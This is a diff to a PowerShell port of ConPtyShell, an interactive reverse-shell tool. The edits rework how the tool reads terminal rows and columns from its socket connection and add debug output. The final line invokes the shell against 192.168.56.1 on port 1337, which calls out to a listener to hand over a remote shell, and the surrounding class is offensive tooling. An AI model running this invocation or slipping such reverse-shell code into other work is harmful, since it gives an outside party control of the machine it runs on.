@@ -930,31 +930,22 @@ class ConPtyShell {
     }
 
     hidden static [void] TryParseRowsColsFromSocket([IntPtr] $shellSocket, [ref] $rows, [ref] $cols) {
-        Write-Host "plop"
         Start-Sleep -Milliseconds 500 # little tweak for slower connections
         $received = New-Object Byte[] 100
-        #$received = [byte[]]::new(100)
-        [Int32] $rowsTemp = 0
-        [Int32] $colsTemp = 0
         
-        [Int32] $bytesReceived = $global:ws2_32::recv($shellSocket, $received, 100, 0)  
+        $global:ws2_32::recv($shellSocket, $received, 100, 0)  
+
+        try {
+            [String] $sizeReceived = [System.Text.Encoding]::UTF8.GetString($received)
+
+            [String] $rowsString = $sizeReceived.Split(' ')[0].Trim()
+            [String] $colsString = $sizeReceived.Split(' ')[1].Trim()
+
+            $rows.Value = [UInt32]$rowsString
+            $cols.Value = [UInt32]$colsString
+
+        } catch {}
     }
-    # ;
-        # try
-        # {
-        #     string sizeReceived = Encoding.ASCII.GetString(received, 0, bytesReceived);
-        #     string rowsString = sizeReceived.Split(' ')[0].Trim();
-        #     string colsString = sizeReceived.Split(' ')[1].Trim();
-        #     if (Int32.TryParse(rowsString, out rowsTemp) && Int32.TryParse(colsString, out colsTemp))
-        #     {
-        #         rows = (uint)rowsTemp;
-        #         cols = (uint)colsTemp;
-        #     }
-        # }
-        # catch
-        # {
-        #     return;
-        # }
 
     hidden static [void] CreatePipes([ref] $InputPipeRead, [ref] $InputPipeWrite, [ref] $OutputPipeRead, [ref] $OutputPipeWrite) {
         $Kernel32 = $global:Kernel32
@@ -1043,6 +1034,9 @@ class ConPtyShell {
                 return ""
             }
             [ConPtyShell]::TryParseRowsColsFromSocket($shellSocket, [ref] $rows, [ref] $cols)
+
+            Write-Host "cols: $cols"
+            Write-Host "rows: $rows"
         }
 
 
@@ -1305,4 +1299,4 @@ function Invoke-ConPtyShell
     Write-Output $output
 }
 
-Invoke-ConPtyShell "192.168.56.1" 1337
+Invoke-ConPtyShell '192.168.56.1' 1337
